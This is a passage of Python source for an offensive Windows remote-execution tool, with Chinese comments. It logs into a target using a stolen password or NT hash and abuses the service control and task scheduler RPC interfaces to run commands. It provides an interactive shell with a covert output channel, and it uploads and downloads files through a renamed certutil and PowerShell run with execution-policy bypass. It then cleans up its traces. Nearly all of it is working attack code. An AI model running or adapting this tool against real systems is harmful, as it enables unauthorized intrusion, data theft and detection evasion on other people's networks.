        '__gpi': 'UID=00000b7a4392902a:T=1668246815:RT=1668750123:S=ALNI_MbUW8GgIU6R3J6t5ZeKA0NRp6n9hg',
        '_lr_retry_request': 'true',
        '_gat_gtag_UA_74823759_31': '1',
        '_au_last_seen_apn': '1668752317494',
        '_au_last_seen_ttd': '1668752317494',
        '_au_last_seen_pub': '1668752317494',
        '_au_last_seen_adx': '1668752317494',
        '_au_last_seen_goo': '1668752317494',
        '_au_last_seen_son': '1668752317494',
        '_au_last_seen_smart': '1668752317494',
        '_au_last_seen_ado': '1668752317494',
        '_au_last_seen_openx': '1668752317494',
        '_au_last_seen_mediamath': '1668752317494',
    }

    headers = {
        'authority': 'www.base64encode.org',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_uc_referrer=https://www.google.com/; _pbjs_userid_consent_data=3524755945110770; __qca=P0-343750202-1668246808037; _tfpvi=YThkY2NhZTUtOTkyMS00NTQyLWFiYTAtNGMxYjgxN2M0MTY0Iy02LTQ%3D; _lr_env_src_ats=false; _cc_id=b00c47f836abdf146bdc7beb6bea3bab; _au_1d=AU1D-0100-001668246816-O5S5WUIL-T6AU; _au_last_seen_iab_tcf=1668246817108; _fbp=fb.1.1668246820488.322481334; _ga=GA1.2.37428437.1668334356; OPTIONS={%22option_text_charset%22:%22UTF-8%22%2C%22option_text_separator%22:%22lf%22%2C%22option_file_charset%22:%22BINARY%22%2C%22option_file_separator%22:%22lf%22%2C%22option_text_newlines%22:%22off%22%2C%22option_text_chunks%22:%22off%22%2C%22option_text_urlsafe%22:%22off%22%2C%22option_file_newlines%22:%22off%22%2C%22option_file_chunks%22:%22off%22%2C%22option_file_urlsafe%22:%22off%22%2C%22option_text_live%22:%22off%22%2C%22textarea_height_input%22:220%2C%22textarea_height_output%22:220}; __gads=ID=80dd962c4e12ca05:T=1668246815:S=ALNI_MaQh_UhYSGdAZ5fNo4tNi2WFPr2kA; cto_bidid=HokRnl90JTJGSHV1VXhGVHR1dE9wUlFhZ1hpcFRFY2h1VVlWaXFQOThGJTJGMUd2SHM2Sk92cGNZVVY2NHBPUW1HejI2UjZhWFRiTFE0N0dUUWFwMWppeiUyQnRibW91JTJCZ0JBZ09XQTBKVFNKYk5uaGd2eVo5ZlllTkd4Q3Q5dEpBSXFWZUl4MmZv; _gid=GA1.2.996041912.1668690088; pbjs_li_nonid=%7B%7D; _au_last_seen_pixels=eyJhcG4iOjE2Njg2OTAwOTQsInR0ZCI6MTY2ODY5MDA5NCwicHViIjoxNjY4NjkwMDk0LCJhZHgiOjE2Njg2OTAwOTQsImdvbyI6MTY2ODY5MDA5NCwic21hcnQiOjE2Njg2OTAxMDIsInBwbnQiOjE2Njg2OTAwOTQsIm1lZGlhbWF0aCI6MTY2ODY5MDEwMiwic29uIjoxNjY4NjkwMDk0LCJhZG8iOjE2Njg2OTAwOTQsInRhYm9vbGEiOjE2Njg2OTAwOTQsImltcHIiOjE2Njg2OTAxMDIsImJlZXMiOjE2Njg2OTAwOTQsInJ1YiI6MTY2ODY5MDEwMiwib3BlbngiOjE2Njg2OTAxMDIsInVucnVseSI6MTY2ODY5MDEwMn0=; cto_bundle=PaVk-l9DUmhSb0o1RGJzcDI0dkhMSmJuJTJGU2d1bEl0Qk1qeUZ3YWlGQnZoN01UZ0pNQjF3dDhJM2FWU3kxN00xVkE5M3VOSUgxQVMyWGh4QkUlMkJUS0RvdGZtbnZQRHglMkJac095bFJWV3lNUXN5allwN3A0ODF6VmxwMmk4bkpoVzZMNjhYMiUyRmlzTXIwbXFCUiUyQkozOWk3bjBZUEtJbFZNeUNCdVFNTGphQW8zdzd1MVVzJTNE; __gpi=UID=00000b7a4392902a:T=1668246815:RT=1668750123:S=ALNI_MbUW8GgIU6R3J6t5ZeKA0NRp6n9hg; _lr_retry_request=true; _gat_gtag_UA_74823759_31=1; _au_last_seen_apn=1668752317494; _au_last_seen_ttd=1668752317494; _au_last_seen_pub=1668752317494; _au_last_seen_adx=1668752317494; _au_last_seen_goo=1668752317494; _au_last_seen_son=1668752317494; _au_last_seen_smart=1668752317494; _au_last_seen_ado=1668752317494; _au_last_seen_openx=1668752317494; _au_last_seen_mediamath=1668752317494',
        'origin': 'https://www.base64encode.org',
        'referer': 'https://www.base64encode.org/',
        'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    }

    data = {
        'input': cmdOrder,
        'charset': aaamy_codec,
        'separator': 'lf',
    }

    #response = requests.post('https://www.base64encode.org/', cookies=cookies, headers=headers, data=data)

    response = requests.post('https://www.base64encode.org/', cookies=cookies, headers=headers, data=data)
    encodeString = convertTuple(re.findall(r"<textarea name=\"output\" id=\"output\" placeholder=\"Result goes here...\" spellcheck=\"false\" style=\"height:220px;\">(.*?)</textarea>", response.text)[0])
    # print("encode result:")
    # print(encodeString.strip())
    return encodeString.strip()
def ip_validation(ip):
    import socket

    try:
        socket.inet_aton(ip)
        # legal
    except socket.error:
        return False
    return True
# Not legal

def convertTuple(tup):
    # initialize an empty string
    str = ''
    for item in tup:
        str = str + item
    return str
def usage():
    print("python sc.py domain/username password|hash targetip targetFQDN")
if not (len(sys.argv) == 4 or len(sys.argv) == 5or len(sys.argv) == 6 or len(sys.argv) == 7):
    usage()
    exit()


argv = sys.argv



nthash=''
targetFQDN='argv[4]'
username=argv[1].split('/')[1]
password=argv[2]
if len(password.split(':',1))==2:
    if len(password.split(':',1)[1])==32:
        nthash=argv[2]
        if len(nthash)>0:
            nthash=nthash.split(':',1)[1]
            nthash=a2b_hex(nthash)
            password=''
domain=argv[1].split('/')[0]
targetip=argv[3]
print(f"[*] using domain: {domain}")
print(f"[*] using user: {username}")
if len(password)>0:
    print(f"[*] using password: {password}")
else:
    if len(nthash)%2!=0:
        print(f"[-] nthash {nthash} malformat")
        usage()
        exit()
    print(f"[*] using nthash: {nthash}")
if not ip_validation(targetip):
    print(f"[-] target ip {targetip} malformat")
    usage()
    exit()
print(f"[*] using target: {targetip}")

targetFQDN=generate_random_string(8)
my_codec='UTF-8'
if len(sys.argv)==5:
    packet_delay = 1234
    my_codec=argv[4]
    print(f"[*] set packet send delay: {packet_delay}")
kdc_host=''
if len(sys.argv)==7:
    my_codec=argv[4]
    targetFQDN=argv[5]
    kdc_host=argv[6]
if len(sys.argv)==6:
    targetFQDN=argv[4]
    kdc_host=argv[5]
# 参数处理完成--------------------------------------------------------------------


# 发送map request，获取RPC监听的端口
scmr_binding_string = hept_map(targetip,uuidtup_to_bin(('367ABB81-9844-35F1-AD32-98F038001003','2.0')),protocol='ncacn_ip_tcp')

tsch_binding_string = hept_map(targetip,uuidtup_to_bin(('86D35949-83C9-4044-B424-DB363231FD0C','1.0')),protocol='ncacn_ip_tcp')

print(f"[+] get svcctl binding string: {scmr_binding_string}")
print(f"[+] get tschsvc binding string: {tsch_binding_string}")

scmrrpc = DCERPCTransportFactory(scmr_binding_string)
scmrrpc.set_credentials(username=username,password=password,domain=domain,nthash=nthash)
scmrrpc.setRemoteHost(targetip)
scmrrpc.setRemoteName(targetFQDN)

tschrpc = DCERPCTransportFactory(tsch_binding_string)
tschrpc.set_credentials(username=username,password=password,domain=domain,nthash=nthash)
tschrpc.setRemoteHost(targetip)
tschrpc.setRemoteName(targetFQDN)

if kdc_host!='':
    scmrrpc.set_kerberos(True, kdc_host)
    tschrpc.set_kerberos(True, kdc_host)

try:
    svcctl=scmrrpc.get_dce_rpc()

    svcctl.set_credentials(*scmrrpc.get_credentials())
    if kdc_host!='':
        svcctl.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
    else:
        svcctl.set_auth_type(RPC_C_AUTHN_WINNT)

    svcctl.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
    svcctl.connect()
    svcctl.bind(scmr.MSRPC_UUID_SCMR)


    print("[+] successfully connected to SCMR RPC")
    tschctl=tschrpc.get_dce_rpc()
    tschctl.set_credentials(*tschrpc.get_credentials())
    if kdc_host!='':
        tschctl.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
    else:
        tschctl.set_auth_type(RPC_C_AUTHN_WINNT)
    tschctl.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
    tschctl.connect()
    tschctl.bind(tsch.MSRPC_UUID_TSCHS)
    print("[+] successfully connected to TSCH RPC")
    # 调用RPC
    # 创建服务，用于填写描述信息
    # 首先需要打开服务管理器
    scManagerHandle = hROpenSCManagerW(svcctl,lpMachineName='')['lpScHandle']

    #
    lpServiceName = generate_random_string(5)
    hService = hRCreateServiceW(svcctl,scManagerHandle,lpServiceName,lpServiceName,dwStartType=SERVICE_DEMAND_START,lpBinaryPathName='C:\\1.txt')['lpServiceHandle']
    print(f"[+] service {lpServiceName} created successfully")

    # 创建一个计划任务
    schtasks_name=generate_random_string(5)
    print(f"[+] schedule task {schtasks_name} created successfully")

    # 更改计划任务的配置其实还是调用wrap_hSchRpcRegisterTask，并没有单独的RPC调用，从schtasks抓的包也是这样的
    # 先将计划任务的xml文件拷贝到另一个地方
    xml_file_name = generate_random_string(5)
    print('copied_xml_file_name: '+xml_file_name)
    wrap_hSchRpcRegisterTask(tschctl,
                             command='whatever',
                             schtasks_name=schtasks_name)
    # 创建一个计划任务用于进行文件上传
    schtasks_name_for_upload=generate_random_string(5)
    print(f"[+] schedule task for file upload {schtasks_name_for_upload} created successfully")

    # 更改计划任务的配置其实还是调用wrap_hSchRpcRegisterTask，并没有单独的RPC调用，从schtasks抓的包也是这样的
    # 先将计划任务的xml文件拷贝到另一个地方
    xml_file_name = generate_random_string(5)
    print('copied_xml_file_name: '+xml_file_name)
    wrap_hSchRpcRegisterTask(tschctl,
                             command='whatever',
                             schtasks_name=schtasks_name_for_upload)
    # wrap_hSchRpcRegisterTask(tschctl,command='copy C:\\windows\\system32\\tasks\\'+schtasks_name+" C:\\users\\public\\" +xml_file_name,schtasks_name=schtasks_name)
    # tsch.hSchRpcRun(tschctl, '\\%s' % schtasks_name)
    # # 睡眠一秒，等待命令完成
    # time.sleep(0.5)



    # 然后需要写入处理结果文件到xml文件并将xml设置到计划任务中的bat脚本
    # 截断xml文件的最后两行，并生成中间文件<Description>和封口文件 </Description></RegistrationInfo></Task>
    # 下面这个是原始脚本
    """
@echo off &&setlocal EnableDelayedExpansion&&chdir C:\\users\\public&& set "cmd=findstr /R/N "^^" xml.xml | find /C ":"" && for /f %%a in ('!cmd!') do set number=%%a
set /a linenumber=%number%-1 && set destfile=file_part_1_file && set inputfile=xml.xml
set count=0 && for /f "delims=" %%a in (%inputfile%) do (
set /a count+=1 && if !linenumber! LEQ !count! (set /a random=1) else (echo %%a >> !destfile!))
echo ^<Description^>>description_header&&echo ^</Description^>^</RegistrationInfo^>^</Task^>>description_tail
    """
    # 卡巴会保护system32目录，导致bat中的for循环出现错误，无法正常写入文件，因此我们需要切换目录到C:\users\public\downloads
    # 好像并不是这个原因，

    # 写入bat脚本
    service_desc_marker = generate_random_string(5)
    file_part_1_name=generate_random_string(5)
    bat_file_name=generate_random_string(5)
    print("service_desc_marker: "+service_desc_marker)
    print("bat_file_name: "+bat_file_name)
    print("file_part_1_name: "+file_part_1_name)

    desc_tail_file_name = generate_random_string(5)
    desc_header_file_name = generate_random_string(5)
    print("desc_header_file_name: "+desc_header_file_name)
    print("desc_tail_file_name: "+desc_tail_file_name)
    split_out_dir_on_target=''
    bat_finish_mark = write_bat(svcctl=svcctl, hService=hService, schtasks_name=schtasks_name, service_name=lpServiceName, service_desc_marker=service_desc_marker,
                                file_part_1_name=file_part_1_name, bat_file_name=bat_file_name, copied_xml_name=xml_file_name,
                                desc_tail_file_name=desc_tail_file_name, desc_header_file_name=desc_header_file_name )
    print("bat_finish_mark: " + bat_finish_mark)
    print(f"bat file write with name {bat_file_name} succeed")

    # 执行上面的bat脚本，将xml进行拆分
    wrap_hSchRpcRegisterTask(tschctl, command=bat_file_name + '.bat', schtasks_name=schtasks_name, action=tsch.TASK_UPDATE)
    tsch.hSchRpcRun(tschctl, '\\%s' % schtasks_name)
    while True:
        time.sleep(0.5)
        motherfucker = retrive_service_description(svcctl, hService, service_desc_marker, my_codec=my_codec)
        if motherfucker == '':
            continue
        if len(motherfucker.split(bat_finish_mark, 1)) >= 2:
            # print("cmd execution finished, trying to get echo back...")
            break

        # print("waiting for cmd execution finish...")


    new_xml_file = generate_random_string(5)
    print("new_xml_file: " + new_xml_file)
    cmd_result_file_name = generate_random_string(5)
    print("cmd_result_file_name: "+cmd_result_file_name)
    sch_backup_filename=generate_random_string(5)
    fake_certutil_name=generate_random_string(5)
    download_fake_certutil_name=generate_random_string(5)
    ps_file_name=generate_random_string(5)
    # 现在可以开始执行命令了
    print("proudly brought to you by 12138 [https://144.one]")
    while True:
        there_is_no_need_to_get_echo_back=False
        #time.sleep(packet_delay)
        finish_mark=generate_random_string(5)
        your_cmd = input('cmd>\n')
        if your_cmd.strip().__len__()==0:
            continue
        if your_cmd=='q':
            break
        command = ''
        if your_cmd.split(">",1).__len__()>=2:
            there_is_no_need_to_get_echo_back = True
            command = f'{your_cmd} && sc description {lpServiceName} "{service_desc_marker + finish_mark + service_desc_marker}"'
        # 文件传输功能，开撸
        elif your_cmd.split('up',1).__len__()>=2:
            # 文件上传
            # 首先对文件进行base64编码
            if len(your_cmd.split('$'))!=3:
                print("malformed, please retype: up$src_path$dest_path")
                continue
            src_path=your_cmd.split('$',1)[1].split('$',1)[0]
            dest_path=your_cmd.split('$',1)[1].split('$',1)[1]
            if len(src_path.strip())==0:
                print("malformed, please retype: up$src_path$dest_path")
                continue
            if len(dest_path.strip())==0:
                print("malformed, please retype: up$src_path$dest_path")
                continue

            if not os.path.exists(src_path):
                print('file does not exist')
                continue
            if not is_path_exists_or_creatable(dest_path):
                print('dest path malformed')
                continue

            # 首先给certutil挪个地方改个名
            fake_certutil_name = generate_random_string(5)
            print(f"fake_certutil_name is {fake_certutil_name}")
            #certutil_is_already_faked=True
            finish_mark = generate_random_string(5)
            # 同时还要创建一个输出目录，用于切分文件
            split_out_dir_on_target = generate_random_string(5)
            print('split_out_dir_on_target: ' + split_out_dir_on_target)
            command = f"copy certutil.exe {fake_certutil_name}.exe&&md {split_out_dir_on_target}&&sc description {lpServiceName} \"{service_desc_marker}{finish_mark}{service_desc_marker}\""

            # 执行一开始预设的bat脚本，将命令结果逐行设置到服务描述中
            wrap_hSchRpcRegisterTask(tschctl, command=command, schtasks_name=schtasks_name, action=tsch.TASK_UPDATE)
            tsch.hSchRpcRun(tschctl, '\\%s' % schtasks_name)

            while True:
                time.sleep(0.5)
                motherfucker = retrive_service_description(svcctl, hService, service_desc_marker, my_codec=my_codec)
                if motherfucker == '':
                    continue
                if motherfucker.split(finish_mark, 1).__len__() >= 2:
                    print("cmd execution finished, trying to get echo back...")
                    break



            # 需要另外创建一个计划任务，因为执行命令的时候当前计划任务的描述信息会被覆盖
            # 其实也不用，加一个命令把这个计划任务复制出来就行了
            # 需要考虑对文件进行分包上传
            if os.path.exists('.'+os.path.sep+'split'):
                shutil.rmtree('.'+os.path.sep+'split')
            time.sleep(0.5)
            os.mkdir('.'+os.path.sep+'split')
            split_out_dir = '.'+os.path.sep+'split'
            i = 0
            with open(src_path, "rb") as in_file:
                # 每次读取1MB
                bytes = in_file.read(1024 * 1024)  # read 5000 bytes
                while bytes:
                    s = str(i)
                    padding = '0'
                    len = 3

                    x = s.rjust(len, padding)
                    with open(split_out_dir+os.path.sep+"out-file-" + x, 'wb') as output:
                        output.write(bytes)
                    bytes = in_file.read(1024 * 1024)  # read another 5000 bytes
                    i += 1
            file_counter_my=0
            print(f'split to {i} 1MB files')
            for filename in os.listdir(split_out_dir):
                s = str(file_counter_my)
                padding = '0'
                len = 3

                x = s.rjust(len, padding)
                file_counter_my=file_counter_my+1
                f = os.path.join(split_out_dir, filename)
                # checking if it is a file
                with open(f, "rb") as binaryFile:
                    encoded_string = base64.b64encode(binaryFile.read())
                encoded_string = encoded_string.decode('utf-8')

                sch_backup_filename=generate_random_string(5)
                print("sch tasks backup file: "+sch_backup_filename)
                finish_mark=generate_random_string(5)




                wrap_upload_hSchRpcRegisterTask(tschctl, encoded_string = encoded_string, sch_backup_filename=sch_backup_filename,lpServiceName=lpServiceName,service_desc_marker=service_desc_marker,finish_mark=finish_mark,schtasks_name = schtasks_name_for_upload, action=tsch.TASK_UPDATE)
                # 可以另外创建一个计划任务，以避免多执行一次copy命令，上传文件的时候就用这个计划任务

                #print(1)
                # 现在的问题是，传上去之后，如何把base64编码的那一行给提取出来
                # 现在的想法是利用现有的bat脚本进行修改，将原来的bat脚本更改为传参的脚本
                """
                @echo off &&setlocal EnableDelayedExpansion&&copy tasks\\atppf %1&& set /a linenumber=45+%4 && set destfile=%2 && set inputfile=%1
    set count=0 && for /f "tokens=* delims=" %%a in ('type "%inputfile%"') do (
    set /a count+=1 && if !linenumber! LEQ !count! (set /a random=1) else (echo %%a >> !destfile!&&echo %%a >%3))
    echo ^<Description^>>yfgas&&echo ^</Description^>^</RegistrationInfo^>^</Task^>>ylxbw&& sc description yqyor oqzpjvlgtsoqzpj
    
    
    
    kebhe 作为第一个参数
    bjiuf 作为第三个参数
    另外我们需要在写入的时候追加一个覆盖写  &&echo %%a >%3
    
    
    对于命令执行，第三个参数是没有用的
    对于文件上传来说，第二个参数是没有用的
    
    所以针对不同的情况生成对应的垃圾随机文件名就行了，最后清理的时候删除就行了
    
    好像是写不进去，因为太长了，cmd hold不住
    
    我他妈真是个天才，只需要在两头加上certuitl的标志字符串就行了
    -----BEGIN CERTIFICATE-----
    -----END CERTIFICATE-----
                """
                # 这是一个阻塞调用，所以返回后，就说明传完了
                # 解码
                print(f"decoding file to {dest_path}")
                finish_mark=generate_random_string(5)
                command = f"{fake_certutil_name}.exe -f -decode tasks\\{schtasks_name_for_upload} {split_out_dir_on_target}\\{x}.txt&&sc description {lpServiceName} \"{service_desc_marker}{finish_mark}{service_desc_marker}\""

                # 执行一开始预设的bat脚本，将命令结果逐行设置到服务描述中
                wrap_hSchRpcRegisterTask(tschctl, command=command, schtasks_name=schtasks_name, action=tsch.TASK_UPDATE)
                tsch.hSchRpcRun(tschctl, '\\%s' % schtasks_name)

                while True:
                    time.sleep(0.5)
                    motherfucker=retrive_service_description(svcctl,hService,service_desc_marker,my_codec=my_codec)
                    if motherfucker == '':
                        continue
                    if motherfucker.split(finish_mark, 1).__len__() >= 2:
                        print("cmd execution finished, trying to get echo back...")
                        break
                print("file decoding succeed, now rename it to the real name")
                print(f"{x} decoded succeed")


            # 合并文件,并删除小文件
            finish_mark = generate_random_string(5)
            command = f"copy /b {split_out_dir_on_target}\\* {dest_path}&&del /q {split_out_dir_on_target}\\*&&sc description {lpServiceName} \"{service_desc_marker}{finish_mark}{service_desc_marker}\""

            # 执行一开始预设的bat脚本，将命令结果逐行设置到服务描述中
            wrap_hSchRpcRegisterTask(tschctl, command=command, schtasks_name=schtasks_name, action=tsch.TASK_UPDATE)
            tsch.hSchRpcRun(tschctl, '\\%s' % schtasks_name)

            while True:
                time.sleep(0.5)
                motherfucker = retrive_service_description(svcctl, hService, service_desc_marker, my_codec=my_codec)
                if motherfucker == '':
                    continue
                if motherfucker.split(finish_mark, 1).__len__() >= 2:
                    print("cmd execution finished, trying to get echo back...")
                    break
            print('file upload succeed')
            # 清理，删除fake certutil，删除输出目录
            print('clearing.......')
            finish_mark=generate_random_string(5)
            command = f"del /q {fake_certutil_name}.exe&&del /q {split_out_dir_on_target}\\*&&rd /q {split_out_dir_on_target}&&sc description {lpServiceName} \"{service_desc_marker}{finish_mark}{service_desc_marker}\""
            wrap_cmd_exec(tschctl,command,schtasks_name,finish_mark)
            continue
        # 文件下载功能，开撸
        elif your_cmd.split('down', 1).__len__() >= 2:
            if len(your_cmd.split('$'))!=3:
                print("malformed, please retype: up$src_path$dest_path")
                continue
            src_path = your_cmd.split('$', 1)[1].split('$', 1)[0]
            dest_path = your_cmd.split('$', 1)[1].split('$', 1)[1]
            if len(src_path.strip()) == 0:
                print("malformed, please retype: up$src_path$dest_path")
                continue
            if len(dest_path.strip()) == 0:
                print("malformed, please retype: up$src_path$dest_path")
                continue
            if os.path.exists(dest_path):
                print('file already exist')
                continue
            if not is_path_exists_or_creatable(src_path):
                print('src path malformed')
                continue

            # 首先给certutil挪个地方改个名
            download_fake_certutil_name = generate_random_string(5)
            print(f"download_fake_certutil_name is {download_fake_certutil_name}")
            # certutil_is_already_faked=True
            finish_mark = generate_random_string(5)
            # 同时还要创建一个输出目录，用于切分文件
            download_split_out_dir_on_target = generate_random_string(5)
            print('download_split_out_dir_on_target: ' + download_split_out_dir_on_target)
            # command = f"copy certutil.exe {download_fake_certutil_name}.exe&&md {download_split_out_dir_on_target}&&sc description {lpServiceName} \"{service_desc_marker}{finish_mark}{service_desc_marker}\""
            # 
            # wrap_cmd_exec(tschctl,command,schtasks_name,finish_mark)
            # 需要写入一个对文件进行拆分的bat脚本
            # 然后需要对文件进行编码
            # 根据certutil的输出，一行是64字节，16行就是1KB，1MB就是1024*16行
            # base64的编码会让文件变大，这也是不得不付出的代价
            # 用bat脚本进行分割太慢了，慢的可怕
            # 转而使用powershell
            ps_file_name = generate_random_string(5)
            encoded_file_name = generate_random_string(5)
            out_dir = generate_random_string(5)

            powershell_finis_finisssssh_mark=write_pwershell(svcctl=svcctl, hService=hService, schtasks_name=schtasks_name, service_name=lpServiceName,
                                                             service_desc_marker=service_desc_marker,
                                                             ps_file_name=ps_file_name, encoded_file_name=encoded_file_name, out_dir=download_split_out_dir_on_target)
            # 对目标文件进行编码
            finish_mark = generate_random_string(5)
            command = f"certutil.exe -f -encode {src_path} {encoded_file_name}&&sc description {lpServiceName} \"{service_desc_marker}{finish_mark}{service_desc_marker}\""

            wrap_cmd_exec(tschctl, command, schtasks_name, finish_mark)
            # 对目标文件进行拆分
            #powershell -executionpolicy bypass -command "& { import-module C:\Users\123\Documents\1\Rubeus\Rubeus\1.ps1; get-domain }"
            command = 'powershell -executionpolicy bypass -command "& { import-module C:\\windows\\system32\\'+ps_file_name+'.ps1; get-domain }"'
            finish_mark = generate_random_string(5)

            wrap_hSchRpcRegisterTask(tschctl, command=command, schtasks_name=schtasks_name, action=tsch.TASK_UPDATE)
            tsch.hSchRpcRun(tschctl, '\\%s' % schtasks_name)
            powershell_split_count=0
            while True:
                time.sleep(0.5)
                motherfucker = retrive_service_description(svcctl, hService, service_desc_marker, my_codec=my_codec)
                if motherfucker == '':
                    continue
                if motherfucker.split(powershell_finis_finisssssh_mark, 1).__len__() >= 2:
                    powershell_split_count=int(motherfucker.replace(powershell_finis_finisssssh_mark,''))
                    print("cmd execution finished, trying to get echo back...")
                    break

            # 分割完成之后，需要按照分割的数量进行回传
            if os.path.exists('.'+os.path.sep+'split_for_download'):
                shutil.rmtree('.'+os.path.sep+'split_for_download')
            time.sleep(0.5)
            os.mkdir('.'+os.path.sep+'split_for_download')
            split_out_dir = '.'+os.path.sep+'split_for_download'
            for i in range(powershell_split_count-1):
                asadsd=i+1
                s = str(asadsd)
                padding = '0'
                len = 4
                x = s.rjust(len, padding)
                print(f"retriving {x}st part file...")

                finish_mark = generate_random_string(5)
                command = f"type {file_part_1_name} {desc_header_file_name}>{new_xml_file}&&type {new_xml_file} {download_split_out_dir_on_target}\\output_{x}>{new_xml_file}1&&type {new_xml_file}1 {desc_tail_file_name}>{new_xml_file}2&&schtasks /create /tn {schtasks_name_for_upload} /xml {new_xml_file}2 /f&&sc description {lpServiceName} \"{service_desc_marker}{finish_mark}{service_desc_marker}\""



                # command = f"schtasks /create /xml {download_split_out_dir_on_target}\\output_{x} /tn {schtasks_name} /f&&sc description {lpServiceName} \"{service_desc_marker}{finish_mark}{service_desc_marker}\""
                #finish_mark = generate_random_string(5)
                wrap_cmd_exec(tschctl, command, schtasks_name_for_upload, finish_mark)
                # 获取内容，简单处理后直接写入文件
                asd = tsch.hSchRpcRetrieveTask(tschctl, '\\%s' % schtasks_name_for_upload)
                xml_content = asd['pXml']
                xml_content=xml_content.replace("-----BEGIN CERTIFICATE-----",'')
                xml_content=xml_content.replace("-----END CERTIFICATE-----",'')
                xml_content=xml_content.strip()
                xml_content=xml_content.split('<Description>', 1)[1].split('</Description>', 1)[0].replace('\n','')
                # Open a file in write mode
                with open(f"{split_out_dir}\\filename.txt{x}", "w") as f:
                    # Write a string to the file
                    f.write(xml_content)
            #合并文件
            print("merging file...")
            import os

            # Path to the directory containing the files to merge
            dir_path = split_out_dir

            # Name of the file to write the merged contents to
            output_file = "merged_file.txt"

            # Open the output file in write mode
            with open(output_file, "w") as f:
                # Loop through all the files in the directory
                for filename in os.listdir(dir_path):
                    # Check if the file is a regular file (i.e., not a directory)
                    if os.path.isfile(os.path.join(dir_path, filename)):
                        # Open the file in read mode and append its contents to the output file
                        with open(os.path.join(dir_path, filename), "r") as input_file:
                            f.write(input_file.read())
            # 解码文件
            import base64

            # Name of the input file
            input_file = "merged_file.txt"

            # Name of the output file
            output_file = dest_path

            # Open the input file in read mode and read its contents
            with open(input_file, "r") as f:
                encoded_data = f.read()

            # Decode the Base64-encoded data
            decoded_data = base64.b64decode(encoded_data)

            # Write the decoded data to the output file
            with open(output_file, "wb") as f:
                f.write(decoded_data)
            print("file is successfully downloaded to "+dest_path)

            # 清理，删除fake certutil，删除输出目录
            print('clearing.......')
            # 还要清理掉编码的文件
            finish_mark=generate_random_string(5)
            command = f"del /q {download_fake_certutil_name}.exe;{encoded_file_name}&&del /q {download_split_out_dir_on_target}\\*&&rd /q {download_split_out_dir_on_target}&&sc description {lpServiceName} \"{service_desc_marker}{finish_mark}{service_desc_marker}\""
            wrap_cmd_exec(tschctl,command,schtasks_name,finish_mark)
            continue
        else:
            command = f'{your_cmd} > {cmd_result_file_name} 2>&1 && sc description {lpServiceName} "{service_desc_marker  + finish_mark + service_desc_marker}"||sc description {lpServiceName} "{service_desc_marker  + finish_mark + service_desc_marker}"'
        wrap_hSchRpcRegisterTask(tschctl, command = command, schtasks_name = schtasks_name, action=tsch.TASK_UPDATE)
        tsch.hSchRpcRun(tschctl, '\\%s' % schtasks_name)
        # 循环等待，获取服务描述来判断命令执行是否已经完成
        time_out_counter=0
        timoutfalg=False
        while True:
            time.sleep(0.5)
            time_out_counter=time_out_counter+1
            motherfucker=retrive_service_description(svcctl, hService, service_desc_marker, my_codec=my_codec)
            if time_out_counter==15:
                print("cmd execute timeout, try again")
                timoutfalg=True
                break
            if motherfucker == '':
                continue
            if motherfucker.split(finish_mark,1).__len__()>=2:
                print("cmd execution finished, trying to get echo back...")
                break

            print("waiting for cmd execution finish...")
        if there_is_no_need_to_get_echo_back:
            continue
        if timoutfalg:
            continue
        # 将输出文件和拆分后的xml进行拼接，形成新的xml文件，并使用该文件修改计划任务配置
        # 将结果进行编码，输出到{cmd_result_file_name}1文件中
        print(f"encoding cmd output to {cmd_result_file_name}1")
        finish_mark=generate_random_string(5)
        command = f"certutil -f -encode {cmd_result_file_name} {cmd_result_file_name}1&&sc description {lpServiceName} \"{service_desc_marker}{finish_mark}{service_desc_marker}\""

        # 执行一开始预设的bat脚本，将命令结果逐行设置到服务描述中
        wrap_hSchRpcRegisterTask(tschctl, command=command, schtasks_name=schtasks_name, action=tsch.TASK_UPDATE)
        tsch.hSchRpcRun(tschctl, '\\%s' % schtasks_name)

        while True:
            time.sleep(0.5)
            motherfucker=retrive_service_description(svcctl,hService,service_desc_marker,my_codec=my_codec)
            if motherfucker == '':
                continue
            if motherfucker.split(finish_mark, 1).__len__() >= 2:
                print("cmd execution finished, trying to get echo back...")
                break

        finish_mark=generate_random_string(5)
        command = f"type {file_part_1_name} {desc_header_file_name}>{new_xml_file}&&type {new_xml_file} {cmd_result_file_name}1>{new_xml_file}1&&type {new_xml_file}1 {desc_tail_file_name}>{new_xml_file}2&&schtasks /create /tn {schtasks_name} /xml {new_xml_file}2 /f&&sc description {lpServiceName} \"{service_desc_marker}{finish_mark}{service_desc_marker}\""

        # 执行一开始预设的bat脚本，将命令结果逐行设置到服务描述中
        wrap_hSchRpcRegisterTask(tschctl, command=command, schtasks_name=schtasks_name, action=tsch.TASK_UPDATE)
        tsch.hSchRpcRun(tschctl, '\\%s' % schtasks_name)

        while True:
            time.sleep(0.5)
            motherfucker=retrive_service_description(svcctl,hService,service_desc_marker,my_codec=my_codec)
            if motherfucker == '':
                continue
            if motherfucker.split(finish_mark, 1).__len__() >= 2:
                print("cmd execution finished, trying to get echo back...")
                break
        #等待该bat脚本执行完成
        # 通过查询计划任务的配置来获取命令回显

        asd=tsch.hSchRpcRetrieveTask(tschctl, '\\%s' % schtasks_name)
        xml_content=asd['pXml']
        print('++++++++++++++++++++++++++++++++++++CMD ECHO++++++++++++++++++++++++++++++++++++\n\n\n\n')
        print(base64.b64decode(xml_content.split('<Description>',1)[1].split('</Description>',1)[0].split('-----BEGIN CERTIFICATE-----',1)[1].split('-----END CERTIFICATE-----',1)[0].replace('\n','')).decode(my_codec))
